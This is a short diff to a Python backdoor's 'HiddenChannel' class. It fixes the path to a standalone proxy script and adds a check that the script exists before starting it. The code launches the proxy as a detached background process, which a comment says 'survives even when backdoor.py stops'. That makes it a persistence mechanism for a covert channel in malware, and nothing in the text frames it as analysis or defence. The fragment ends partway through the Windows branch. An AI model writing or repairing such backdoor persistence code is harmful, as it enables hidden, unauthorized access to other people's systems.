@@ -179,14 +179,17 @@ class HiddenChannel:
             return False, "proxy channel already running"
         
         try:
-            # Get path to standalone proxy script
+            # Get path to standalone proxy script (in same features folder)
             current_dir = os.path.dirname(os.path.abspath(__file__))
-            parent_dir = os.path.dirname(current_dir)
-            standalone_script = os.path.join(parent_dir, "standalone_proxy.py")
+            standalone_script = os.path.join(current_dir, "standalone_proxy.py")
             
             # Start standalone proxy process (survives even when backdoor.py stops)
             python_exe = sys.executable
             cmd = [python_exe, standalone_script, str(self.listen_port)]
+            
+            # Debug: Check if script exists
+            if not os.path.exists(standalone_script):
+                return False, f"Standalone script not found: {standalone_script}"
             
             # Start process in background (detached from parent)
             if os.name == 'nt':  # Windows
